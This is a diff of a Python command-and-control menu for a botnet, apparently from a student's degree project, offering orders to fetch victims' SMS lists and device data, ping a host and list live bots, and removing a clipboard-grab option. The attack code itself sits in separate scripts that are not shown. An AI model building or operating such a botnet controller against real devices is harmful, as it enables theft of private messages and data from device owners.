@@ -1,34 +1,43 @@
 # Botmaster para el TFG de Nicolas Cea Porras
-# Pensado para ser utilizado en kali linux con python3
+# Pensado para ser utilizado en kali linux pero puede utilizarse solo con python3
 
 import os
 
 ################################################ MENU ############################################################
 def menu():
-    mensajeMenu = """Please select an action:\n 
-    (1) Send an order to the Botnet
-    (2) Exit
-    """
-    errorSeleccion = "Please use an available integer from the list above\n"
-    print(mensajeMenu)
-
-    seleccionMenu = 0
     while True:
-        try:
-            seleccionMenu = int(input("Option: "))
-            if(not(seleccionMenu>=1 and seleccionMenu<=2)):
-                raise Exception
-        except:
-            print(errorSeleccion)
-            continue
-        else:
-            break
-        
-    if seleccionMenu == 1:
-        seleccionPrimitivas()
-        
-    if seleccionMenu == 2:
-        salir()
+        mensajeMenu = """Please select an action:\n 
+        (1) Send an order to the Botnet
+        (2) Get information from the botnet
+        (3) See alive bots
+        (4) Exit
+        """
+        errorSeleccion = "Please use an available integer from the list above\n"
+        print(mensajeMenu)
+
+        seleccionMenu = 0
+        while True:
+            try:
+                seleccionMenu = int(input("Option: "))
+                if(not(seleccionMenu>=1 and seleccionMenu<=4)):
+                    raise Exception
+            except:
+                print(errorSeleccion)
+                continue
+            else:
+                break
+            
+        if seleccionMenu == 1:
+            seleccionPrimitivas()
+            
+        if seleccionMenu == 2:
+            seleccionPrimitivas()
+            
+        if seleccionMenu == 3:
+            os.system("python3 botsVivos.py")
+            
+        if seleccionMenu == 4:
+            salir()
 
 ################################################ SALIR ############################################################
 
@@ -48,9 +57,8 @@ def seleccionPrimitivas():
         (3) get sms list
         (4) get device data
         (5) send ping to host
-        (6) get clipboard data
-        (7) go back to menu
-        (8) exit
+        (6) go back to menu
+        (7) exit
         """
         print(mensajePrimitivas)
         errorSeleccion = "Please use an available integer from the list above\n"
@@ -60,7 +68,7 @@ def seleccionPrimitivas():
         while True:
             try:
                 seleccionMenu = int(input("Option: "))
-                if(not(seleccionMenu>=1 and seleccionMenu<=8)):
+                if(not(seleccionMenu>=1 and seleccionMenu<=7)):
                     raise Exception
             except:
                 print(errorSeleccion)
@@ -79,10 +87,8 @@ def seleccionPrimitivas():
         if seleccionMenu == 5:
             os.system("python3 ping.py")
         if seleccionMenu == 6:
-            os.system("python3 clipboard.py")
-        if seleccionMenu == 7:
             menu()
-        if seleccionMenu == 8:
+        if seleccionMenu == 7:
             salir()
 
         print("Please select another order for the botnet")
